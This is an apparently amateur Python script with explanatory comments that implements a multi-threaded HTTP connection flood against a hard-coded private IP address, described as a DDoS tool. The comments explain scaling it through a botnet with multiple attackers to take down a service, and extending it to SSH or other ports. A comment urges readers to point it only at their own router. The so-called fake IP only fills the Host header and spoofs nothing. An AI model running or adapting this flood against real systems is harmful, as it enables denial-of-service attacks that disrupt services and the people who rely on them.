import threading
import socket
#----------------------#
#How Attack DDOS WORK?
#----------------------#
#----------------------------------------------------------------------------------------------------
#Python doesn't support real multi-threading so if you're doing multi-threading and python it's not
#actual multi-threading its simulated multi-threading so youre basically switching between the tasks as
#fast as possible but its not actual multi-theading so you might want to use a different language for that
#but it still works since its sending a lot of reqests at the same timne
#DDoS you router or laptop!
#Dont go ahead and detail some other websites its highly ok
#i take ip of my router
#----------------------------------------------------------------------------------------------------

target = '10.0.0.138'
port = 80
fake_ip = '182.21.20.32'

already_connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host:"+ fake_ip + "\r\r\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)



for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
#----------------------------------------------------------------------------------------------------
#basically this is how you do it you define a method that sense a connection in endless loop and
#then what you do is you basically run multipe threads at the same time attacking the you have bots
#or botnet with computers that all run this script at the same time and then maybe you also have
#multiple attackers and in the end you take down a service like that of course you can again specify different
#ports then this part "  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #s.connect((target, port))
        #s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        #s.sendto(("Host:"+ fake_ip + "\r\r\r\n").encode('ascii'), (target, port))
        #s.close() "
#then this part here doesnt make a lot of sense but you can also try to take down the SSH sever or
#other services whatever but this is how you basically do it you define a method run multiple threats and
#then you ttake down the system!
#----------------------------------------------------------------------------------------------------
#Victor Bourman!



















